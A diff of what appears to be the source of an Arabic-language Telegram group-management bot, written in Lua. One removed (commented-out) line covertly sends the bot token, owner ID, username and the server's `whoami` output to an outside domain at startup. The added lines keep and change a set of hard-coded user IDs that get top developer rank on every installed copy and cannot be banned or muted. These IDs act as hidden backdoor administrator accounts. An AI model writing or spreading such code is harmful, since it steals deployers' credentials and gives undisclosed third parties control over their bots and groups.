@@ -72,7 +72,7 @@ infotnseb.id = database:get(id_server..":SUDO:ID")
 infotnseb.username = database:get(id_server..":SUDO:USERNAME")
 infotnseb.tokenbot = database:get(id_server..":token")
 infotnseb.userjoin = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
-https.request('https://devdeiveddev.ml/api/avaer.php/?insert='..JSON.encode(infotnseb))
+--https.request('https://devdeiveddev.ml/api/avaer.php/?insert='..JSON.encode(infotnseb))
 print('\n\27[1;34m dddddoooonnnnnneeeeeeee sssseeeeennnnnnnddddddd :')
 create_config_auto()
 botUserName = database:get(id_server..":token_username")
@@ -192,7 +192,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,1360140225,1896382059,1828361895,1816750928}   
+sudo_users = {SUDO,1360140225,1609348805,1828361895,1816750928}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -284,7 +284,7 @@ end
 function Can_or_NotCan(user_id,chat_id)
 if tonumber(user_id) == tonumber(1360140225) then  
 var = true
-elseif tonumber(user_id) == tonumber(1896382059) then
+elseif tonumber(user_id) == tonumber(1609348805) then
 var = true
 elseif tonumber(user_id) == tonumber(1816750928) then
 var = true
@@ -324,12 +324,12 @@ end
 function Rutba(user_id,chat_id)
 if tonumber(user_id) == tonumber(1360140225) then  
 var = ' مبـرمـج افـايـره'
-elseif tonumber(user_id) == tonumber(1896382059) then
-var = 'مبرمج السورس²'
+elseif tonumber(user_id) == tonumber(1609348805) then
+var = 'مطور السورس'
 elseif tonumber(user_id) == tonumber(1816750928) then
 var = 'مـطـور الـسـورس'
 elseif tonumber(user_id) == tonumber(1828361895) then
-var = 'مطور السورس'
+var = 'مالك السورس'
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
 elseif database:sismember(bot_id.."Dev:SoFi:2", user_id) then
@@ -2806,7 +2806,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '  ◍ D𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 𖣌 ',url="t.me/UU_BENT_DEN"},{text = ' ◍ D𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 𖣌 ',url="t.me/UU_DEN"}},
+{{text = '  ◍ D𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 𖣌 ',url="t.me/Medo_at"},{text = ' ◍ D𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 𖣌 ',url="t.me/UU_DEN"}},
 {{text = '  ◍ M𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻𝚂 𖣌 ', url="t.me/Lo_ga_n1"}},
 {{text = '   ²₀²₁ ˝₀₄˝₁₃ | ₁₂:₀₀ 𝙿𝙼  ', url="t.me/Lo_ga_n1"}},
 }https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Lo_ga_n1&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -4055,7 +4055,7 @@ if tonumber(result.sender_user_id_) == tonumber(1360140225) then
 send(msg.chat_id_, msg.id_, " ◉ لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1896382059) then  
+if tonumber(result.sender_user_id_) == tonumber(1609348805) then  
 send(msg.chat_id_, msg.id_, " ◉ لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
@@ -4105,7 +4105,7 @@ if result.id_ == tonumber(1360140225) then
 send(msg.chat_id_, msg.id_, " ◉ لا يمكنك حظر مبرمج السورس \n")
 return false 
 end
-if result.id_ == tonumber(1896382059) then
+if result.id_ == tonumber(1609348805) then
 send(msg.chat_id_, msg.id_, " ◉ لا يمكنك حظر مبرمج السورس \n")
 return false 
 end
@@ -4153,7 +4153,7 @@ if tonumber(userid) == tonumber(1828361895) then
 send(msg.chat_id_, msg.id_, " ◉ لا تسطيع حظر مبرمج باور عام")
 return false 
 end
-if tonumber(userid) == tonumber(1896382059) then  
+if tonumber(userid) == tonumber(1609348805) then  
 send(msg.chat_id_, msg.id_, " ◉ لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
@@ -4194,7 +4194,7 @@ if tonumber(result.sender_user_id_) == tonumber(1360140225) then
 send(msg.chat_id_, msg.id_, " ◉ لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1896382059) then  
+if tonumber(result.sender_user_id_) == tonumber(1609348805) then  
 send(msg.chat_id_, msg.id_, " ◉ لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
@@ -4247,7 +4247,7 @@ if result.id_ == tonumber(1828361895) then
 send(msg.chat_id_, msg.id_, " ◉ لا يمكنك كتم مبرمج باور عام \n")
 return false 
 end
-if result.id_ == tonumber(1896382059) then
+if result.id_ == tonumber(1609348805) then
 send(msg.chat_id_, msg.id_, " ◉ لا يمكنك كتم مبرمج السورس \n")
 return false 
 end
@@ -4291,7 +4291,7 @@ if tonumber(userid) == tonumber(1360140225) then
 send(msg.chat_id_, msg.id_, " ◉ لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
-if tonumber(userid) == tonumber(1896382059) then  
+if tonumber(userid) == tonumber(1609348805) then  
 send(msg.chat_id_, msg.id_, " ◉ لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
